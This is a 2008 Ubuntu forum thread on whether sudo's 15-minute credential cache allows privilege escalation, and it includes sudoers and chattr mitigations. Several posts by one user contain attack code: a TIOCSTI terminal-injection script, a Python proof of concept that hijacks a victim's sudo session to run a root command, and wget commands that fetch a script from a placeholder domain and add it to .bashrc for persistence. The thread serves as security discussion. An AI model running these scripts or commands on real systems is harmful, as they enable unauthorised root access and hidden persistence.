---
title: "Gksudo and Ubuntu's security model"
date: 2008-09-04
forum: Recurring Discussions
---

### Post by SEMW on 2008-09-04
I've become more interested in security recently, and I'm trying to get a better understanding of Ubuntu's security model.

Now, one of the cornerstones of Linux security is the seperation of user and root; so even if I inadvertently run a compromised program in normal use (or if, say, there's a vulnerability in Firefox that allows a web page to run malicious code or something), it can't harm anything beyond my user account (my signature nonwithstanding).  Right?

Also, one of the things about sudo and gksudo is that they store your password for 15 minutes; so if I run, say, Login Window manager and type in my password, and then in 5 minutes time run Synaptic, Synaptic gains root privileges without my having to type in my password again.

And that's what's confusing me: how are those two reconciled?  What is there to stop a malicious program easily gaining root privileges by waiting around until I run Synaptic and then relaunching itself with gksudo?  Sure, it might have to wait a few days, but I'm bound to run something which uses gksu/gksudo eventually; no?  How does Ubuntu stop that happening?

---

### Post by cdenley on 2008-09-04
I think this is a possibility, but the program would have to continually try using sudo until it is not prompted for a password since your user does not have permission to list the timestamps. Also, they would have to be using the correct tty for which the timestamp gets created. Of course, you can force a password to be required everytime sudo is used.
```

export EDITOR=/usr/bin/nano
sudo -E visudo

```
Add ",timestamp_timeout=0" to the line starting with "Defaults".

Perhaps another way to prevent this would be to print a warning if someone has been repeatedly trying to use sudo unsuccessfully. For all I know, such a mechanism may be implemented already.

---

### Post by SEMW on 2008-09-04
> **cdenley said:**
> the program would have to continually try using sudo until it is not prompted for a password since your user does not have permission to list the timestamps.   Also, they would have to be using the correct tty for which the timestamp gets created. 

I can see how those would be problems for exploiting when sudo is used in a terminal (on top of which, the user would be able to see the program doing this, since it would have to be in the same terminal as the user has just run sudo in, i.e. a visible terminal).

But surely none of those barriers apply with graphical apps? An app that runs as root, such as synaptic, shows up in "ps x" as "gksu /usr/bin/synaptic" while it's running.  So couldn't a malicious program just run "ps x | grep gksu" every 2 minutes, and then launch itself with gksu if the result's more than 1 line?  Wouldn't that would avoid both the problems you mentioned (since all graphical apps part of the same "tty", i.e. 7, right?)?

Thanks for the instructions to fix the problem -- I'm going to leave it for now, because I'm still reasonably confident that I've just missed something and there's nothing to fix -- it would be pretty unbelievable if all Ubuntu installations were trivially vulnerable to this by default.  It's hard to believe that the Ubuntu devs who set the timeout to 15 minutes (and, indeed, the sudo developers who included the feature) didn't think through the security implications.  I'm just interested in how they solved them.

---

### Post by cdenley on 2008-09-04
> **SEMW said:**
> I can see how those would be problems for exploiting when sudo is used in a terminal (on top of which, the user would be able to see the program doing this, since it would have to be in the same terminal as the user has just run sudo in, i.e. a visible terminal).

But surely none of those barriers apply with graphical apps? An app that runs as root, such as synaptic, shows up in "ps x" as "gksu /usr/bin/synaptic" while it's running.  So couldn't a malicious program just run "ps x | grep gksu" every 2 minutes, and then launch itself with gksu if the result's more than 1 line?  Wouldn't that would avoid both the problems you mentioned (since all graphical apps part of the same "tty", i.e. 7, right?)?

Thanks for the instructions to fix the problem -- I'm going to leave it for now, because I'm still reasonably confident that I've just missed something and there's nothing to fix -- it would be pretty unbelievable if all Ubuntu installations were trivially vulnerable to this by default.  It's hard to believe that the Ubuntu devs who set the timeout to 15 minutes (and, indeed, the sudo developers who included the feature) didn't think through the security implications.  I'm just interested in how they solved them.

Checking to see if sudo is currently running could be an alternative to checking for a timestamp that I hadn't thought of. However, they would need to check while sudo is running. If they query every two minutes, sudo would usually run then exit before their query. They would probably be able to query the running processes pretty frequently, though, without the user noticing. Also, sudo doesn't exit until the command it runs exits, so running graphical applications with sudo would leave the sudo process running.

I wouldn't be surprised if this is a real possibility, considering there are other little trivial things such as this. For example, if your account is compromised they can edit your .bashrc to create an alias for sudo, so you enter your password into a wrapper script they created which does whatever with your password and runs the command you gave as an argument using the real sudo in addition to whatever else they want to do as sudo.

By the way, to protect yourself from that example
```

sudo chattr +i ~/.bashrc

```

---

### Post by Too Late on 2008-09-04
I've always wondered why anybody would use Ubuntu's default security settings. However, they aren't the worst ones, because it's quite easy to fix them to meet the usability criterias most of us (normal desktop users) have. Basically, you just have to add a single word into the sudoers file to disable (almost all) password prompts, while still having separate normal user permissions and root/sudo privileges.

What kind of defaults does Intrepid have?

---

### Post by aysiu on 2008-09-04
> **SEMW said:**
> I can see how those would be problems for exploiting when sudo is used in a terminal (on top of which, the user would be able to see the program doing this, since it would have to be in the same terminal as the user has just run sudo in, i.e. a visible terminal). If you run *sudo* in a terminal and then open another terminal and run another *sudo* command, you will be prompted a second time.

The *sudo* timeout is shell-specific. It isn't a global timeout.

It's global only for graphical applications (GDM setup, Synaptic, etc.)

My view on this is that right now we already get so many people complaining about how many times they have to type in their passwords (oh, boo-hoo!) that changing the *sudo* timeout to zero would just make these people more determined to log in as root all the time, which is even worse.

If real threats started exploiting the timeout, I'm sure the devs would change the default to 0 seconds.

---

### Post by Dr Small on 2008-09-04
> **aysiu said:**
> If real threats started exploiting the timeout, I'm sure the devs would change the default to 0 seconds.

+1
In the meantime, if it bugs you, you can also change the timeout to whatever you want.

---

### Post by mc4100 on 2008-09-04
> **SEMW said:**
> But surely none of those barriers apply with graphical apps? An app that runs as root, such as synaptic, shows up in "ps x" as "gksu /usr/bin/synaptic" while it's running.  So couldn't a malicious program just run "ps x | grep gksu" every 2 minutes, and then launch itself with gksu if the result's more than 1 line.
OK, I really haven't a clue what I'm talking about, but wanted to give my thoughts:
   How is the "program" running? 
I don't think it would be able to run and monitor without being run multiple times by the user, or giving superuser privileges to it, which sort of defeats the purpose.

---

### Post by anotherdisciple on 2008-09-04
Wouldn't the solution be to just not use a graphical sudo? I never use synaptic or add/remove... I just install and upgrade through the terminal... and since it's shell specific... no problems, right?

---

### Post by Too Late on 2008-09-04
> **anotherdisciple said:**
> Wouldn't the solution be to just not use a graphical sudo? I never use synaptic or add/remove... I just install and upgrade through the terminal... and since it's shell specific... no problems, right?
How can you be sure that the magic malware program won't use the same shell?

---

### Post by cdenley on 2008-09-04
> **mc4100 said:**
> OK, I really haven't a clue what I'm talking about, but wanted to give my thoughts:
   How is the "program" running? 
I don't think it would be able to run and monitor without being run multiple times by the user, or giving superuser privileges to it, which sort of defeats the purpose.

Well, the issue is privilege escalation. The assumption is your regular user account is already compromised, and they either have their own shell, or they can modify your .bashrc or something to trick you into starting a process and forking it into the background.

> Wouldn't the solution be to just not use a graphical sudo? I never use synaptic or add/remove... I just install and upgrade through the terminal... and since it's shell specific... no problems, right?
sudo and gksudo work the same. It creates a different timestamp for each tty, but as stated, the tty sudo is running on can be retrieved easily.

---

### Post by SpaceMaster on 2008-09-04
> **aysiu said:**
> If you run *sudo* in a terminal and then open another terminal and run another *sudo* command, you will be prompted a second time.

The *sudo* timeout is shell-specific. It isn't a global timeout.

It's global only for graphical applications (GDM setup, Synaptic, etc.)

My view on this is that right now we already get so many people complaining about how many times they have to type in their passwords (oh, boo-hoo!) that changing the *sudo* timeout to zero would just make these people more determined to log in as root all the time, which is even worse.

If real threats started exploiting the timeout, I'm sure the devs would change the default to 0 seconds.

Does that mean the exploiting program would have to run a GUI to exploit that timeout?

---

### Post by Too Late on 2008-09-04
> **SpaceMaster said:**
> Does that mean the exploiting program would have to run a GUI to exploit that timeout?
No, it doesn't.

---

### Post by aysiu on 2008-09-04
If a program has "installed" itself to your user directory and is able to keep launching the command *sudo something* or *gksudo something*, your system has pretty much been compromised, hasn't it? I mean, if one user account is compromised, it's only a matter of time before the whole system is compromised anyway.

How would this program install itself and run in the user space constantly?

---

### Post by cdenley on 2008-09-04
> **aysiu said:**
> If a program has "installed" itself to your user directory and is able to keep launching the command *sudo something* or *gksudo something*, your system has pretty much been compromised, hasn't it? I mean, if one user account is compromised, it's only a matter of time before the whole system is compromised anyway.

How would this program install itself and run in the user space constantly?

> 
Well, the issue is privilege escalation. The assumption is your regular user account is already compromised


If privilege separation is useless since "it's only a matter of time before the whole system is compromised anyway", then why use sudo at all? Because privilege escalation shouldn't be possible or easy.

---

### Post by aysiu on 2008-09-04
> **cdenley said:**
> If privilege separation is useless since "it's only a matter of time before the whole system is compromised anyway", then why use sudo at all? Because privilege escalation shouldn't be possible or easy. I would say it's because time can be on your side. If you notice something is wrong with your user account, it's a lot easier to quarantine that account and still have a functional Ubuntu installation to diagnose the problem or, in the worst-case scenario, delete the account.

It's great to thwart malware before it gets installed, but one of the biggest problems with Windows is removing malware. It's usually a complicated procedure that isn't even 100% effective. The best bet is usually to reinstall. If the damage were user-specific, it'd be a lot easier to deal with and clean up.

---

### Post by cdenley on 2008-09-04
Anyone know how to take over a user's tty? I can't figure out how to force a tty for a shell. I know if the user uses sudo in a shell, then closes the shell, an attacker can then start a shell with the tty which matches the sudo timestamps, but if the user keeps the tty opened, is it possible to hijack it?

---

### Post by cdenley on 2008-09-04
> **aysiu said:**
> I would say it's because time can be on your side. If you notice something is wrong with your user account, it's a lot easier to quarantine that account and still have a functional Ubuntu installation to diagnose the problem or, in the worst-case scenario, delete the account.

It's great to thwart malware before it gets installed, but one of the biggest problems with Windows is removing malware. It's usually a complicated procedure that isn't even 100% effective. The best bet is usually to reinstall. If the damage were user-specific, it'd be a lot easier to deal with and clean up.

Well you would have much more time if sudo timestamps couldn't be reused. Users probably wouldn't realize there is anything wrong with their account. Most tools used to find compromised account would be used with sudo, which would result in privilege escalation before you can do anything about it. Once the attacker gains sudo access, the damage is no longer user-specific. I don't agree with the argument that "privilege escalation is not siginificant since it is unpreventable, but privilege seperation should give admins enough time to recognize an account has been compromised".

---

### Post by aysiu on 2008-09-04
> **cdenley said:**
> Well you would have much more time if sudo timestamps couldn't be reused. Users probably wouldn't realize there is anything wrong with their account. Most tools used to find compromised account would be used with sudo, which would result in privilege escalation before you can do anything about it. Once the attacker gains sudo access, the damage is no longer user-specific. I don't agree with the argument that "privilege escalation is not siginificant since it is unpreventable, but privilege seperation should give admins enough time to recognize an account has been compromised".
You wouldn't scan for the breach using the potentially compromised account.

You would boot a live CD or mount the Ubuntu partition from another drive.

I agree that it would be better security to have the timeout be 0 seconds, but, as I explained before, that tactic, before a real privilege escalation exploit appears, is likely to backfire for many users (the same users who are already annoyed by typing in their passwords only every fifteen minutes) who will then decide it's easier to just log in as root all the time, which is even worse than a fifteen-minute timeout.

---

### Post by Too Late on 2008-09-04
> **aysiu said:**
> I agree that it would be better security to have the timeout be 0 seconds, but, as I explained before, that tactic, before a real privilege escalation exploit appears, is likely to backfire for many users (the same users who are already annoyed by typing in their passwords only every fifteen minutes) who will then decide it's easier to just log in as root all the time, which is even worse than a fifteen-minute timeout.
I don't believe that they would decide to log in as root, because the root account doesn't exist by default. Editing the sudoers file is not more difficult than enabling root.

---

### Post by aysiu on 2008-09-04
> **Too Late said:**
> I don't believe that they would decide to log in as root, because the root account doesn't exist by default. Editing the sudoers file is not more difficult than enabling root.
You mean editing it to not require a password?

---

### Post by cdenley on 2008-09-04
> **cdenley said:**
> Anyone know how to take over a user's tty? I can't figure out how to force a tty for a shell. I know if the user uses sudo in a shell, then closes the shell, an attacker can then start a shell with the tty which matches the sudo timestamps, but if the user keeps the tty opened, is it possible to hijack it?

This is how it would be done
```

#!/usr/bin/env python
import fcntl,termios
fd=open("/dev/pts/1")
cmd=raw_input("hijack# ")
while cmd!="exit" and cmd!="":
    for c in cmd:
        fcntl.ioctl(fd,termios.TIOCSTI,c)
    fcntl.ioctl(fd,termios.TIOCSTI,"\n")
    cmd=raw_input("hijack# ")
fd.close()

```
However, you can't simulate key presses as a non-root user apparently. I'm over-thinking this, though, as an attacker could kill the user's shell, if necessary, in order to take over their tty. With either method, the user would notice something is wrong, though, since the above script actually puts commands into the shell and runs them on the user's screen.

---

### Post by Too Late on 2008-09-04
> **aysiu said:**
> You mean editing it to not require a password?
Or enable a "password memory"/timeout. (That could be commented by default.)

But disabling the password completely is not bad idea either. It's not the same thing as logging in as root.

---

### Post by cdenley on 2008-09-05
proof of concept
```

#!/usr/bin/env python
import os,time,signal,pty
def GetTty(pid):
    stdout,stdin=os.popen2("ps -p "+str(pid))
    stdin.readline()
    line=stdin.readline()
    return line[10:11]
found=False
target=0
bash=[]
print "waiting for a sudo session"
while not found:
    dirs=os.listdir('/proc')
    bash=[]
    time.sleep(0.2)
    for d in dirs:
        try:
            pid=int(d)
            cmd=os.readlink("/proc/"+d+"/exe")
            if(cmd=="/bin/bash"):
                tty=int(os.readlink("/proc/"+d+"/fd/0")[9:])
                bash.append((pid,tty))
        except ValueError:
            pass
        except OSError, e:
            pass
        except IOError, e:
            pass
    for d in dirs:
        try:
            pid=int(d)
            fd=open("/proc/"+d+"/cmdline","rb")
            cmd=fd.readline()
            if(cmd[:5]=="sudo\0"):
                target=int(GetTty(pid))
                found=True
            fd.close()
        except ValueError:
            pass
        except OSError, e:
            pass
        except IOError, e:
            pass
print "found a sudo session, waiting for password"
time.sleep(10)
shells=target
for b in bash:
    if b[1]==target:
        try:
            os.kill(b[0],signal.SIGKILL)
            os.waitpid(b[0],0)
        except OSError, e:
            pass
    elif b[1]<target:
        shells-=1
time.sleep(1)
count=1
while count<shells:
    pty.spawn("sleep 5")
pty.spawn(("/usr/bin/sudo","mkdir","/hacked"))
print "created  directory /hacked"

```
This script waits for the user to start sudo, assumes it is the same user the script is running as, waits 10 seconds for the user to enter his password, kills his shell if it's still running, creates psuedo-terminals until it has the correct tty number to match the sudo session's, then finally uses sudo to create the directory /hacked.

---

### Post by aysiu on 2008-09-05
> **cdenley said:**
> proof of concept
```

#!/usr/bin/env python
import os,time,signal,pty
def GetTty(pid):
    stdout,stdin=os.popen2("ps -p "+str(pid))
    stdin.readline()
    line=stdin.readline()
    return line[10:11]
found=False
target=0
bash=[]
print "waiting for a sudo session"
while not found:
    dirs=os.listdir('/proc')
    bash=[]
    time.sleep(0.2)
    for d in dirs:
        try:
            pid=int(d)
            cmd=os.readlink("/proc/"+d+"/exe")
            if(cmd=="/bin/bash"):
                tty=int(os.readlink("/proc/"+d+"/fd/0")[9:])
                bash.append((pid,tty))
        except ValueError:
            pass
        except OSError, e:
            pass
        except IOError, e:
            pass
    for d in dirs:
        try:
            pid=int(d)
            fd=open("/proc/"+d+"/cmdline","rb")
            cmd=fd.readline()
            if(cmd[:5]=="sudo\0"):
                target=int(GetTty(pid))
                found=True
            fd.close()
        except ValueError:
            pass
        except OSError, e:
            pass
        except IOError, e:
            pass
print "found a sudo session, waiting for password"
time.sleep(10)
shells=target
for b in bash:
    if b[1]==target:
        try:
            os.kill(b[0],signal.SIGKILL)
            os.waitpid(b[0],0)
        except OSError, e:
            pass
    elif b[1]<target:
        shells-=1
time.sleep(1)
count=1
while count<shells:
    pty.spawn("sleep 5")
pty.spawn(("/usr/bin/sudo","mkdir","/hacked"))
print "created  directory /hacked"

```
This script waits for the user to start sudo, assumes it is the same user the script is running as, waits 10 seconds for the user to enter his password, kills his shell if it's still running, creates psuedo-terminals until it has the correct tty number to match the sudo session's, then finally uses sudo to create the directory /hacked.
But how does this script itself get running?

---

### Post by cdenley on 2008-09-05
> **aysiu said:**
> But how does this script itself get running?

I think this is the third time I've said it. The idea is **privilege escalation**. The assumption is that the attacker already has the ability to run a script as the user. So the script gets run when the user does something stupid.

**privilege escalation**
**privilege escalation**
**privilege escalation**

---

### Post by Dr Small on 2008-09-05
> **cdenley said:**
> I think this is the third time I've said it. The idea is **privilege escalation**. The assumption is that the attacker already has the ability to run a script as the user. So the script gets run when the user does something stupid.

**privilege escalation**
**privilege escalation**
**privilege escalation**
Which, in the end, means a user has to be tricked by SE to get the script to run. The script could be ran from another script that the user failed to review, and then downloads itself, and begins executing.

I could think up all kind of tricky ways to keep the script to run. Getting the user to execute it is the challenging part (but not really, if you give this person a scirpt which could begin the whole process.)

---

### Post by aysiu on 2008-09-05
So how would the script be executed in the first place? By social engineering?

If that's the case, it's almost pointless. If you can trick the user, why not save yourself the extra step of escalating privileges by just tricking the user into installing the script with root privileges in the first place: "In order to play this video, you need to install blah-blah-blah multimedia codec. Click here to download the .deb file"

---

### Post by cdenley on 2008-09-05
> **aysiu said:**
> So how would the script be executed in the first place? By social engineering?

If that's the case, it's almost pointless. If you can trick the user, why not save yourself the extra step of escalating privileges by just tricking the user into installing the script with root privileges in the first place: "In order to play this video, you need to install blah-blah-blah multimedia codec. Click here to download the .deb file"

-social engineering
-browser hijacking
-weak ssh keys
-user forgets to log out

---

### Post by aysiu on 2008-09-05
Okay.

Social engineering I get, but as I explained before, installing a user-level script and then escalating privileges is just an added step. Go straight for root if you're going to bother tricking the user.

I don't know too much about browser hijacking. How is that achieved, and once it is, can that constantly run a script in the background?

Assumes the user is running OpenSSH, no? In a default Ubuntu installation (which is what we're talking about, since the timeout is 15 minutes, instead of 0), I don't think that is running.

So you're talking about someone physically sitting down at your computer. Doesn't she then have root access anyway? Why run a script on a user level?

---

### Post by cdenley on 2008-09-05
> **aysiu said:**
> Okay.

Social engineering I get, but as I explained before, installing a user-level script and then escalating privileges is just an added step. Go straight for root if you're going to bother tricking the user.

I don't know too much about browser hijacking. How is that achieved, and once it is, can that constantly run a script in the background?

Assumes the user is running OpenSSH, no? In a default Ubuntu installation (which is what we're talking about, since the timeout is 15 minutes, instead of 0), I don't think that is running.

So you're talking about someone physically sitting down at your computer. Doesn't she then have root access anyway? Why run a script on a user level?

I don't know why you're trying to argue privilege escalation is not an issue. It is a lot easier to compromise a user account than it is root.
> 
Go straight for root if you're going to bother tricking the user

Even better yet, just ask for their password! Maybe they will even send you money if you ask nice enough. Tricking someone into running a script is not usually as hard as tricking someone into running a script as sudo. If you're asking me step-by-step how to compromise a user's account, I don't know. If I did, I would be a bit more concerned about that. There are security vulnerabilities found all the time that can allow attackers to execute arbitrary code as the user running the vulnerable software. I don't find these vulnerabilities and don't know how to exploit them. I do know they exist, though.

---

### Post by aysiu on 2008-09-05
But in order to exploit the 15-minute timeout, you would have to run arbitrary code pretty much all the time, right?

And, no, I don't think it's that much more difficult to trick someone into running a script with *sudo*, especially if it comes as part of a .deb file, which is double-click-installable.

---

### Post by cdenley on 2008-09-05
> **aysiu said:**
> But in order to exploit the 15-minute timeout, you would have to run arbitrary code pretty much all the time, right?

And, no, I don't think it's that much more difficult to trick someone into running a script with *sudo*, especially if it comes as part of a .deb file, which is double-click-installable.

You make the arbitrary code do something like this
```

wget http://mydomain.com/hackme.py
./hackme.py&

```

Or something like this
```

wget http://mydomain.com/hackme.py -o ~/.innocent.py
echo "./.innoceny.py&">>~/.bashrc

```

Anytime the user has to enter their password, they should be aware they are doing something that requires root, and will be more cautious.

---

### Post by john_v_schmitt on 2008-12-31
Well, what's the answer folks?

Ever since I first installed & used Ubuntu, I had exactly the same concerns about privilege escalation.

Cdenley's valid concerns don't seem to be addressed by the other posters.

I guess the only solution I'm seeing is to essentially undo ubuntu's decision & go back to "root" (just under a different name) by having at least 2 user accounts:

1)  user_real = a user account with zero sudo access.  No password, nothing.  Not in /etc/sudoers.   This is the real user account you use when surfing the web, etc.

2)  user_admin = (would've been called "root" on any other *nix system) = a user account which can sudo, which you explicitly login as whenever you want to do root actions. 

Any better ways?

---

